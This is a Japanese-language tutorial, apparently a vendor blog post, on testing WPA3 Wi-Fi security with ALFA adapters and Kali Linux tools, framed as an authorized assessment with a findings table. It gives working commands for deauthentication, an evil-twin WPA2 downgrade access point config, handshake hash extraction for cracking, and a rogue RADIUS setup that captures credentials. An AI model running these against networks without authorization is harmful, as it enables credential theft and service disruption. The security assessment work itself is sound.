---
title: "ALFAアダプターによるWPA3セキュリティテスト（2026）"
description: "ALFA Networkアダプターを使用したWPA3セキュリティテストの包括的なガイド。SAEハンドシェイク分析、Dragonblood脆弱性、トランジションモードダウングレード攻撃、PMF適用、WPA3-Enterprise EAPテストを網羅。"
date: 2026-03-24
draft: false
showBreadcrumbs: true
showTableOfContents: true
tags: ["WPA3", "SAE", "dragonblood", "transition-mode", "PMF", "kali-linux", "ALFA-network", "penetration-testing"]
---

{{< alert "triangle-exclamation" >}}
**法的通知：** 無線セキュリティテストは、明示的な書面による承認を得たネットワークおよびデバイスに対してのみ実施してください。SAEキャプチャ、デオーセンティケーション、不正AP展開を含むWPA3テスト技術は、その他の無線アセスメント活動と同じ法的要件の対象となります。認可されたテストのみ実施してください。
{{< /alert >}}

WPA3はパーソナルおよびエンタープライズの両方の無線セキュリティにおいてWPA2から大幅に改善されています。Simultaneous Authentication of Equals（SAE）は、Pre-Shared Key（PSK）ハンドシェイクを、オフライン辞書攻撃に耐性のあるパスワード認証鍵交換に置き換えます。Protected Management Frames（PMF）は必須です。フォワードシークレシーが組み込まれています。

しかし、WPA3には脆弱性がないわけではありません。Dragonblood研究（2019年）では、SAEハンドシェイク実装にサイドチャネルおよびサービス拒否の脆弱性が発見されました。トランジションモードにはダウングレード攻撃の表面があります。エンタープライズ展開はWPA2-Enterpriseと同じ802.1X証明書検証の弱点に直面します。このガイドでは、徹底的なアセスメントに必要なモニターモードの安定性とインジェクション機能を提供するALFA Networkアダプターを使用したWPA3セキュリティテストの完全な方法論をカバーします。

---

## セキュリティテスター向けWPA3の基礎

### SAE：Simultaneous Authentication of Equals

SAEは、WPA2-PSKの4-wayハンドシェイクをDragonfly鍵交換プロトコルに基づくゼロ知識証明交換に置き換えます。セキュリティテストにとって重要な特性は **フォワードシークレシー** です。Wi-Fiパスワードが後に漏洩しても、以前にキャプチャされたトラフィックは復号できません。これにより、SAEのみのネットワークに対するオフラインパスフレーズクラッキングの主要な価値が排除されます。

SAEはまた、WPA2に影響を与えたPMKID攻撃への脆弱性も排除します。パッシブ攻撃者がSAE関連付けから抽出できるオフラインクラック可能なアーティファクトは存在しません。

### PMF：WPA3では必須

802.11w Protected Management Framesは、WPA3では必須です。デオーセンティケーションとディスアソシエーションフレームは暗号的に保護されており、PMFのないWPA2ネットワークに対して簡単に有効な偽のデオーセンティケーション攻撃を防ぎます。WPA3のみのネットワークは、デオーセンティケーションベースのハンドシェイクキャプチャ加速に対して免疫を持つべきです。

### WPA3トランジションモード

最も一般的な実世界の展開シナリオは **WPA3トランジションモード** です。APはWPA3をサポートしないデバイスとの後方互換性を維持するために、WPA3-SAEとWPA2-PSK認証の両方を同時に受け入れます。このモードは現在のエンタープライズ環境における主要な攻撃表面です。WPA3を宣伝するネットワーク上でWPA2 PSKハンドシェイクの露出が再導入されます。

### WPA3-Enterprise

WPA3-Enterpriseは、証明書ベースの相互認証を伴うGCMP-256とHMAC-SHA-384を使用した192ビットセキュリティモードを義務付けています。適切に展開されていない場合、WPA2-Enterpriseと同じ証明書検証の脆弱性に対処します。802.1X層のテスト方法論は[エンタープライズ無線セキュリティアセスメントフレームワーク](/ja/blog/enterprise-wireless-security-assessment/)でカバーされています。

---

## テスト環境とアダプター要件

### アダプターの選択

WPA3テストには、信頼性の高いモニターモード、インジェクションサポート、および6 GHz WPA3ネットワーク向けのトライバンド機能を持つアダプターが必要です：

- **AWUS036AXML** — Wi-Fi 6E（6 GHz）WPA3ネットワークに必須。Mediatek MT7921AUNチップセット。カーネル5.18以降のKali Linuxでの完全なモニターモードとインジェクションサポート。WPA3のみの展開がますます一般的になっている6 GHzチャンネルをカバーする唯一のALFAアダプター。
- **AWUS036ACH** — 2.4/5 GHz WPA3テストに適切。RTL8812AUチップセット。aircrack-ngツールチェーンとの最大互換性と、Kali Linuxバージョン全体での最も広いドライバーサポート。

### モニターモードの有効化

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Verify monitor interface
iwconfig wlan0mon
```

完全なモニターモードセットアップガイドについては、[Kali Linuxでモニターモードを有効にする](/ja/blog/enable-monitor-mode-kali-linux/)をご覧ください。

### スキャン結果でのWPA3ネットワークの特定

```bash
# Passive scan across all bands
sudo airodump-ng wlan0mon --band abg -w wpa3_scan

# Filter for WPA3 networks in results
sudo airodump-ng wlan0mon --band abg | grep -i "SAE\|WPA3"
```

airodump-ngの出力では、WPA3-SAEネットワークはAUTHカラムに `WPA3 SAE` と表示されます。トランジションモードネットワークは `WPA2 WPA3 SAE PSK` と表示されます。オープン（OWE）拡張ネットワークは `OWE` と表示されます。

---

## フェーズ1：SAEハンドシェイクキャプチャと分析

### パッシブキャプチャの制限

WPA2とは異なり、**SAEハンドシェイクはオフライン辞書攻撃に使用できません**。SAEコミットとコンファームフレームのキャプチャは、モニターモードアダプターで簡単に実行できますが、キャプチャされたマテリアルからクラック可能なハッシュは得られません。SAEフレームをキャプチャする目的は、プロトコルレベルの分析です。正しいSAEバリアントが使用されていることの確認、PMFがネゴシエートされていることの確認、アセスメントレポートへの証拠の提供です。

```bash
# Capture on the target AP channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w sae_capture wlan0mon

# Analyze the capture in Wireshark
# Filter: wlan.bssid == aa:bb:cc:dd:ee:ff && wlan.fc.type_subtype == 0x000b
# (0x000b = Authentication frame)
wireshark -r sae_capture-01.cap
```

認証フレームで、SAEコミットとコンファーム交換を確認します。ビーコンフレームのRSN情報要素には以下が表示されるべきです：
- **AKMスイート**：WPA3-Personalの場合は00-0F-AC:8（SAE）
- **PMF**：Required（RSN CapabilitiesのMFPRビットが設定されている）

### SAEネットワークでのPMKIDテスト

`hcxdumptool` などのツールはすべてのネットワークでPMKID抽出を試みますが、SAEネットワークはクラック可能なPMKIDを露出しません。ツールを実行することで、WPA2 PMKID露出がないことを確認する価値があります：

```bash
# Attempt PMKID capture — SAE networks should yield no crackable PMKID
sudo hcxdumptool -i wlan0mon -o wpa3_pmkid.pcapng --enable_status=3

# Convert and inspect
hcxpcapngtool -o wpa3_hashes.hc22000 wpa3_pmkid.pcapng

# An empty or absent hash file confirms no WPA2 PMKID exposure
wc -l wpa3_hashes.hc22000
```

WPA3のみとして宣伝されているネットワークに対して `hcxpcapngtool` が `.hc22000` ファイルを出力した場合、APがトランジションモードで動作してWPA2 PMKIDを露出していることを示します。これは重大な調査結果です。

---

## フェーズ2：トランジションモードダウングレード攻撃テスト

### ダウングレード攻撃の表面

WPA3トランジションモードは、現在のエンタープライズ環境で最も影響が大きいWPA3の脆弱性です。APがトランジションモードで動作する場合、SAEとPSKの両方の関連付けを受け入れます。クライアントのプローブリクエストを観察できる攻撃者は、同じSSIDに対してWPA2-PSK機能のみを提示する不正APを作成できます。クライアントがSAEを要求せずに接続した場合、標準的なWPA2 4-wayハンドシェイクがキャプチャされ、オフラインで攻撃できます。

### テスト手順

```bash
# Step 1: Confirm the target is in transition mode (shows WPA2+WPA3 in airodump-ng)
sudo airodump-ng wlan0mon --band abg | grep "TARGET_SSID"

# Step 2: Capture the legitimate AP's beacon to note its channel and configuration
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w transition_recon wlan0mon

# Step 3: Create a WPA2-only rogue AP on the same channel using hostapd
# Create /tmp/rogue_wpa2.conf:
cat > /tmp/rogue_wpa2.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TARGET_SSID
channel=6
hw_mode=g
wpa=2
wpa_passphrase=TestPassphrase123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/rogue_wpa2.conf &

# Step 4: Monitor for client associations on the rogue AP
sudo airodump-ng -c 6 --bssid ROGUE_BSSID -w downgrade_capture wlan0mon
```

**Criticalの調査結果：** SAE経由で以前接続していたクライアントがWPA2のみの不正APに関連付けた場合（キャプチャファイル内の4-wayハンドシェイクで証明）、クライアントOSはWPA3-SAE要件を適用していません。これはダウングレード攻撃の成功を表します。

**合格条件：** クライアントがWPA2のみのAPを無視するか警告を表示し、WPA2ハンドシェイクを完了しない。

### hcxpcapngtoolの出力でのダウングレード指標

```bash
# Convert rogue AP capture — presence of hash confirms WPA2 association occurred
hcxpcapngtool -o downgrade_hash.hc22000 downgrade_capture-01.cap
cat downgrade_hash.hc22000
# Non-empty output = downgrade attack succeeded
```

---

## フェーズ3：Dragonblood脆弱性アセスメント

### 背景

Dragonblood研究（Vanhoef & Ronen、2019年）では、SAEハンドシェイク実装に複数の脆弱性が発見されました：

- **CVE-2019-9494 / CVE-2019-9496**：SAEコミットフレームに対するサイドチャネル攻撃（キャッシュベースおよびタイミングベース）。パッチが当たっていない実装に対するオフライン辞書攻撃を可能にする
- **CVE-2019-9499**：SAEコンファームバイパスにより、WPA3-PersonalからWPA2-PSKへのダウングレードが生じる
- **SAEコミットフラッディングによるDoS**：大量のSAEコミットフレームを送信することでAPステートテーブルを枯渇させる

最近のAPファームウェアのほとんどは、元のDragonblood脆弱性にパッチを当てています。しかし、古いAPファームウェアまたはパッチが当たっていないAPファームウェアを持つ環境では、それらのテストが引き続き関連します。

### SAEアンチクロッギングトークンテスト

WPA3-SAEには、コミットフラッディングによるDoSを防ぐためのアンチクロッギングメカニズムが含まれています。ターゲットAPがアンチクロッギングを正しく実装しているかどうかをテストします：

```bash
# Install hcxtools
sudo apt install hcxtools

# Use hcxdumptool to observe SAE commit/confirm frame exchange rate limiting
sudo hcxdumptool -i wlan0mon -o dragonblood_test.pcapng --enable_status=3

# In Wireshark, filter for Authentication frames and observe:
# wlan.fc.type_subtype == 0x000b
# Look for Anti-Clogging Token (ACT) responses in commit frames
wireshark -r dragonblood_test.pcapng
```

正しく実装されたAPでは、複数のソースMACアドレスからの急速なSAEコミットリクエストがアンチクロッギングトークン（ACT）応答をトリガーするべきです（APは後続のコミットフレームに含める必要があるトークンを返します）。ACTを実装していないAPはSAEコミットフラッディングDoSに対して脆弱です。

### APファームウェアバージョンの確認

APファームウェアのバージョンはパッチ状態の強力な指標です。発見されたAPファームウェアバージョンをベンダーのセキュリティアドバイザリと比較します：

- Cisco: Security Advisory cisco-sa-wpa3-sae-side-channel (2019)
- Aruba: ArubaOS 8.6+ patches Dragonblood
- Ubiquiti: UniFi Network 6.0+ patches Dragonblood
- MikroTik: RouterOS 6.45.7+ patches Dragonblood

APファームウェアバージョンをアセスメントレポートに記録してください。これらのリリース以前のファームウェアを実行しているAPは、アクティブな悪用が確認されていない場合でも、潜在的に脆弱であるとフラグを立てるべきです。

---

## フェーズ4：WPA3ネットワークでのPMF適用テスト

### PMFテストが依然として適用される理由

PMFはWPA3では必須ですが、実際の適用動作をテストすることが重要です。理由は以下の通りです：

1. トランジションモードのAPでは、WPA2パスでPMFが「capable」ではなく「required」に設定されている場合があり、WPA2接続クライアントに対するデオーセンティケーション攻撃を許可する
2. APの設定ミスにより、SAE関連付けでもPMFがネゴシエートされない場合がある
3. クライアントの実装では、APが必須として宣伝していてもPMFを正しく適用しない場合がある

### デオーセンティケーションテスト

```bash
# Attempt deauth against a test client associated via WPA3-SAE
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon

# Expected result on a correctly configured WPA3 network:
# - Test client does NOT disconnect (PMF-protected management frames dropped)
# - airodump-ng shows no handshake captured

# Failure condition (finding):
# - Test client disconnects and reassociates
# - airodump-ng captures a new handshake
```

### PMF CapableとRequired

ビーコンフレームのRSN情報要素を確認してPMF設定を確認します：

```bash
# Capture beacon frames and decode RSN IE
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.capabilities.mfpc -e wlan_mgt.rsn.capabilities.mfpr \
  -c 5 2>/dev/null
```

出力の解釈：
- `1,1` — PMF Required（MFPR=1、MFPC=1）：WPA3として正しい
- `1,0` — PMF Capable but not Required：WPA3ネットワークではMediumの調査結果、企業SSIDではHigh
- `0,0` — PMF Disabled：WPA3を宣伝するネットワークでのHighの調査結果；APの設定ミスを示す

---

## フェーズ5：OWE（Opportunistic Wireless Encryption）テスト

### OWEの概要

OWE（Wi-Fi Enhanced Open）は、完全にオープン（非暗号化）なゲストネットワークのWPA3置き換えです。OWEはパスワードを必要とせずにセッションごとの暗号化を確立するために、未認証のDiffie-Hellman鍵交換を実行します。ゲストネットワークでのパッシブ盗聴から保護しますが、認証は提供しません。

### OWEトランジションモードのテスト

多くのAPはレガシーオープンSSID（オープンSSIDは隠し、OWE SSIDは表示）と並行してOWEをトランジションモードで展開しています。クライアントをレガシーオープンSSIDに強制的に接続させられるかどうかをテストします：

```bash
# Scan for hidden SSIDs paired with OWE networks
sudo airodump-ng wlan0mon --band abg | grep -E "OWE|\<length: 0\>"

# A hidden SSID with no encryption paired with an OWE SSID is the transition SSID
# Clients with WPA3 support should prefer OWE; legacy clients fall back to open
```

**調査結果：** WPA3対応クライアントがOWE SSIDではなくオープントランジションSSIDに接続する場合、クライアントOSはOWEトランジションモードを正しく処理していません。そのクライアントからのすべてのトラフィックは暗号化されていません。

---

## フェーズ6：WPA3-Enterpriseアセスメント

### 192ビットセキュリティモードの検証

WPA3-Enterpriseは、192ビットセキュリティモードでGCMP-256暗号化とHMAC-SHA-384認証を義務付けています。ビーコンフレームのRSN IEで確認します：

```bash
# Capture and decode RSN IE for enterprise SSID
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.pcs.type -e wlan_mgt.rsn.akms.type \
  -c 10 2>/dev/null
```

WPA3-Enterprise 192ビットの期待される値：
- **ペアワイズ暗号スイート**：GCMP-256（00-0F-AC:9）
- **AKMスイート**：EAP-SHA384（00-0F-AC:12）またはFT-EAP-SHA384（00-0F-AC:13）

WPA3-EnterpriseネットワークにCCMP-128が存在する場合はMediumの調査結果です。APは192ビットセキュリティ要件を適用していません。

### 不正RADIUSテスト

WPA3-Enterpriseは、クライアントがサーバー証明書を検証しない場合、不正RADIUSアタックに対して脆弱です。テスト方法論はWPA2-Enterpriseと同一です：

```bash
# Deploy rogue AP with rogue RADIUS using hostapd-wpe
sudo apt install hostapd-wpe

# Edit /etc/hostapd-wpe/hostapd-wpe.conf for target SSID and channel
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Monitor for captured credential hashes
```

完全なEAP/RADIUSテスト手順については、[エンタープライズ無線セキュリティアセスメントフレームワーク](/ja/blog/enterprise-wireless-security-assessment/)をご覧ください。

---

## WPA3テストのツールキットリファレンス

<div class="table-nowrap" style="overflow-x: auto;">

| ツール | 用途 | アダプター | 主なコマンド |
|---|---|---|---|
| airodump-ng | WPA3ネットワーク探索、SAEフレームキャプチャ | AWUS036AXML / AWUS036ACH | `sudo airodump-ng wlan0mon --band abg` |
| hcxdumptool | PMKID/SAEキャプチャ、トランジションモード検出 | AWUS036AXML | `sudo hcxdumptool -i wlan0mon -o out.pcapng --enable_status=3` |
| hcxpcapngtool | キャプチャの変換、トランジションモードでのWPA2露出検出 | N/A (post-processing) | `hcxpcapngtool -o hash.hc22000 cap.pcapng` |
| Wireshark / tshark | RSN IE分析、PMF機能、SAEフレーム検査 | Any (via capture file) | `tshark -i wlan0mon -T fields -e wlan_mgt.rsn.capabilities.mfpr` |
| aireplay-ng | PMF適用テスト（デオーセンティケーション） | AWUS036ACH | `sudo aireplay-ng --deauth 10 -a BSSID wlan0mon` |
| hostapd | ダウングレードテスト用WPA2のみの不正AP | AWUS036ACH | `sudo hostapd /tmp/rogue_wpa2.conf` |
| hostapd-wpe | WPA3-Enterprise EAPテスト用不正RADIUS | AWUS036ACH | `sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf` |

</div>

---

## WPA3アセスメントの調査結果サマリー

| ID | 深刻度 | 調査結果 | 条件 |
|---|---|---|---|
| W3-01 | Critical | WPA3からWPA2へのダウングレード成功；ハンドシェイクをキャプチャしクラック可能 | クライアントがWPA2のみの不正APに関連付け；ハッシュを回収 |
| W3-02 | High | SAE適用なしのトランジションモード；WPA2 PMKIDが露出 | hcxpcapngtoolがWPA3ネットワークからクラック可能なハッシュを返す |
| W3-03 | High | WPA3 SSIDでPMFが適用されていない；デオーセンティケーション攻撃成功 | テストクライアントがaireplay-ngのデオーセンティケーションで切断 |
| W3-04 | High | WPA3-Enterpriseクライアントが証明書警告なしに不正RADIUSを受け入れる | hostapd-wpeがテストクライアントからEAP認証情報をキャプチャ |
| W3-05 | Medium | WPA3 SSIDでPMFがCapableのみでRequired未設定 | RSN IEがMFPC=1、MFPR=0を示す |
| W3-06 | Medium | WPA3-Enterpriseが192ビットセキュリティモードを使用していない | RSN IEがGCMP-256の代わりにCCMP-128を示す |
| W3-07 | Medium | APファームウェアがDragonbloodパッチ以前のバージョン | ファームウェアバージョンをベンダーアドバイザリと比較 |
| W3-08 | Low | OWEトランジションモード；レガシークライアントが暗号化なしで接続 | OWE SSIDと並行してオープンSSIDが表示されている |

---

## 関連リソース

- [エンタープライズ無線セキュリティアセスメント：完全フレームワーク](/ja/blog/enterprise-wireless-security-assessment/)
- [パケットインジェクションガイド：aireplay-ngを使用したWiFiアダプターのテスト](/ja/blog/packet-injection-guide/)
- [Kali Linuxでモニターモードを有効にする](/ja/blog/enable-monitor-mode-kali-linux/)
